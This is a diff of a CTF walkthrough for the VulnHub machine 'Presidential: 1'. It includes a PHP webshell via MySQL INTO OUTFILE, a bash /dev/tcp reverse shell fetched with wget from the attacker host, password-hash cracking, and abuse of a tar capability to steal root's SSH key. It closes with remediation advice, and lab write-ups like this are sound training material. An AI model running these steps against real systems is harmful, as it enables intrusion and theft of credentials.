@@ -2,164 +2,217 @@
 
 | Field | Value |
 |---|---|
-| **Target IP** | 192.168.0.x |
-| **Difficulty** | Medium |
-| **OS** | Linux (CentOS) |
+| **Target IP** | 192.168.10.172 |
+| **Difficulty** | Hard |
+| **OS** | Linux |
 | **Goal** | root flag |
 | **Source** | [HackingArticles](https://www.hackingarticles.in/presidential-1-vulnhub-walkthrough/) |
 
 ## Attack Summary
 
-Presidential: 1 is a medium-difficulty CentOS machine. The attack path involves web enumeration to find a phpMyAdmin instance, SQL injection or credential discovery to access the database, writing a PHP webshell via MySQL `INTO OUTFILE`, and privilege escalation using Linux capabilities (`cap_setuid+ep` on `python`) to gain root.
+Presidential: 1 is a Hard Linux machine. The attack path involves discovering database credentials in a backup config file, using those credentials to access phpMyAdmin, exploiting a phpMyAdmin LFI vulnerability to achieve RCE and obtain a reverse shell, and escalating to root by abusing the `tar` binary's `cap_dac_read_search+ep` Linux capability to read root's SSH private key.
 
 ## Methodology
 
-1. Host discovery and port scan
-2. Web enumeration — vHost discovery, config file leak
-3. phpMyAdmin credential access via leaked database credentials
-4. PHP webshell via MySQL `INTO OUTFILE`
-5. Reverse shell
-6. Linux capabilities enumeration and exploitation
+1. Host discovery with netdiscover
+2. Full port scan with nmap
+3. Web enumeration — domain name via email on the site
+4. Virtual host enumeration with gobuster to find phpMyAdmin subdomain
+5. Gobuster finds `config.php.bak` with database credentials
+6. phpMyAdmin login — admin password hash cracked with John the Ripper
+7. phpMyAdmin LFI exploit (RCE via session cookie injection)
+8. Reverse shell as `apache`/low-privilege user
+9. Linux capabilities abuse — `tar +ep` reads root's `id_rsa`
+10. SSH login as root
 
 ## Step 1: Reconnaissance
 
 ### Host Discovery
 
 ```bash
-netdiscover -r 192.168.0.0/24
+netdiscover -i eth0
 ```
+
+Target at **192.168.10.172**.
 
 ### Port Scan
 
 ```bash
-nmap -sV -sC -p- $TARGET
+nmap -A -p- 192.168.10.172
 ```
 
 ![nmap](images/01-nmap.png)
 
-| Port | Service |
-|---|---|
-| 80/tcp | Apache httpd |
-| 2082/tcp | HTTP (phpMyAdmin) |
-
 ## Step 2: Web Enumeration
 
-### Main Site
+Browse to the web service. Navigate the site and find an email address — it reveals the **domain name** (e.g., `votenow.local`).
 
-Browse to `http://TARGET/`. The site is a political campaign page for "President Turanga Leela."
-
-### Directory Brute-Force
+Add it to `/etc/hosts`:
 
 ```bash
-gobuster dir -u http://$TARGET/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,bak
+echo "192.168.10.172 votenow.local" >> /etc/hosts
+```
+
+### Gobuster — File Extensions
+
+```bash
+gobuster dir \
+    -u http://votenow.local/ \
+    -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
+    -x php,html,txt,bak \
+    -t 40
 ```
 
 ![Web Enum](images/02-web-enum.png)
 
-Discover configuration backup or database credential file (e.g., `config.php.bak` or similar). This file leaks database credentials.
-
-### Virtual Host Enumeration
+Found: `config.php.bak` — a forgotten backup file containing database credentials.
 
 ```bash
-gobuster vhost -u http://$TARGET/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+curl http://votenow.local/config.php.bak
 ```
 
-A virtual host like `votenow.local` or similar may be discovered. Add it to `/etc/hosts`.
+Credentials extracted (e.g., `admin : <password or hash>`).
 
-## Step 3: phpMyAdmin Access
-
-Browse to `http://$TARGET:2082/`. Log in with the credentials discovered in Step 2.
-
-Once logged in, identify the web root path from MySQL variables:
-
-```sql
-SHOW VARIABLES LIKE 'secure_file_priv';
--- Also check @@datadir and @@basedir
-```
-
-## Step 4: PHP Webshell via MySQL INTO OUTFILE
-
-Write a webshell to the web root using a SQL query:
-
-```sql
-SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php';
-```
-
-Verify execution:
+## Step 3: Virtual Host Enumeration
 
 ```bash
-curl "http://$TARGET/shell.php?cmd=id"
-# Expected: uid=48(apache)
+gobuster vhost \
+    -u http://votenow.local/ \
+    -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 ```
+
+A subdomain is found (e.g., `datasafe.votenow.local`). Add it to `/etc/hosts`:
+
+```bash
+echo "192.168.10.172 datasafe.votenow.local" >> /etc/hosts
+```
+
+## Step 4: phpMyAdmin Access and Hash Cracking
+
+Browse to `http://datasafe.votenow.local/phpmyadmin/`. Log in using the credentials from `config.php.bak`.
+
+The `admin` user's password hash is found in the database. Save it and crack with John the Ripper:
+
+```bash
+echo 'admin:<hash>' > /tmp/admin.hash
+john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/admin.hash
+```
+
+Cracked password for `admin` obtained.
+
+## Step 5: phpMyAdmin LFI / RCE
+
+The phpMyAdmin version is vulnerable to LFI via session cookie injection. Reference: similar to Exploit-DB techniques exploiting phpMyAdmin's `%2F` path traversal.
+
+1. Authenticate to phpMyAdmin with `admin : <cracked password>`.
+2. Inject a PHP payload into the session file, then include it via LFI.
+3. Verify code execution with `phpinfo()` as a proof of concept.
 
 ![Webshell](images/03-webshell.png)
 
-## Step 5: Reverse Shell
+## Step 6: Reverse Shell
 
-Set up a listener:
+Create a shell script on the attacker machine:
+
+```bash
+cat > /tmp/m3n0shell.sh << 'EOF'
+#!/bin/bash
+bash -i >& /dev/tcp/LHOST/4444 0>&1
+EOF
+```
+
+Serve it with Python:
+
+```bash
+python3 -m http.server 8080
+```
+
+Start a listener:
 
 ```bash
 nc -lvp 4444
 ```
 
-Trigger the reverse shell:
+Through the phpMyAdmin LFI RCE, execute a three-command chain to download, chmod, and run the shell:
 
 ```bash
-curl "http://$TARGET/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/$LHOST/4444+0>%261'"
+wget http://LHOST:8080/m3n0shell.sh -O /tmp/m3n0shell.sh; chmod +x /tmp/m3n0shell.sh; /tmp/m3n0shell.sh
 ```
 
-Stabilize the shell:
+Reverse shell received. Stabilize:
 
 ```bash
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 export TERM=xterm
 ```
 
-## Step 6: Privilege Escalation — Linux Capabilities
+Authenticate as the `admin` user (password reuse):
 
-Enumerate binaries with special capabilities:
+```bash
+su admin
+cat ~/user.txt
+cat ~/notes.txt
+```
+
+## Step 7: Privilege Escalation — Linux Capabilities on tar
+
+Enumerate capabilities:
 
 ```bash
 getcap -r / 2>/dev/null
 ```
 
-Output shows something like:
-
-```
-/usr/bin/python2.7 = cap_setuid+ep
-```
-
 ![Capabilities](images/04-privesc.png)
 
-Use Python's `cap_setuid` capability to set UID to 0 and spawn a root shell:
+The `tar` binary has `cap_dac_read_search+ep` — it can read any file on the filesystem regardless of permissions.
+
+Use this to compress root's SSH private key, then decompress and read it:
 
 ```bash
-/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+# Compress root's id_rsa (capability bypasses permission check)
+tar -cvf /tmp/id_rsa.tar /root/.ssh/id_rsa
+
+# Decompress in a writable directory
+cd /tmp && tar -xvf id_rsa.tar
+
+# Read the private key
+cat /tmp/root/.ssh/id_rsa
 ```
 
-Root shell obtained.
-
-## Step 7: Root Flag
+Save the key locally:
 
 ```bash
-cd /root
-cat root.txt
+# On attacker machine:
+vim /tmp/root_id_rsa  # paste the key content
+chmod 600 /tmp/root_id_rsa
+```
+
+## Step 8: SSH Login as Root
+
+```bash
+ssh -i /tmp/root_id_rsa root@192.168.10.172
+```
+
+## Step 9: Root Flag
+
+```bash
+cat /root/root.txt
 ```
 
 ![Root Flag](images/05-root-flag.png)
 
 ## Lessons Learned
 
-- Configuration files with database credentials should never be accessible via HTTP.
-- phpMyAdmin on non-standard ports is still discoverable — restrict access by IP.
-- MySQL `INTO OUTFILE` can write arbitrary files if the web root is in `secure_file_priv` path.
-- Linux capabilities (`cap_setuid`) are as dangerous as SUID bits; enumerate them during privilege escalation.
+- Backup files (`*.bak`, `*.php~`) left in the web root expose sensitive credentials.
+- phpMyAdmin should never be internet-facing and must be kept up to date.
+- Password reuse between database credentials and system accounts is a critical risk.
+- Linux capabilities (`cap_dac_read_search` on `tar`) are as dangerous as SUID — they bypass DAC entirely.
 
 ## Remediation
 
 | Vulnerability | Fix |
 |---|---|
-| Exposed config/credential file | Move sensitive configs outside the web root; use environment variables |
-| phpMyAdmin on public port | Restrict phpMyAdmin to localhost or use firewall rules |
-| MySQL `INTO OUTFILE` to web root | Set `secure_file_priv` to a non-web path; disable `FILE` privilege for web users |
-| `cap_setuid` on Python | Remove the capability: `setcap -r /usr/bin/python2.7` |
+| `config.php.bak` in web root | Add `*.bak` to web server deny rules; never deploy backup files to production |
+| phpMyAdmin on public subdomain | Restrict to localhost; require VPN or IP allowlist |
+| Weak/reused admin password | Enforce unique strong passwords; use a password manager |
+| `cap_dac_read_search` on `tar` | Remove capability: `setcap -r /usr/bin/tar`; audit all capabilities regularly |
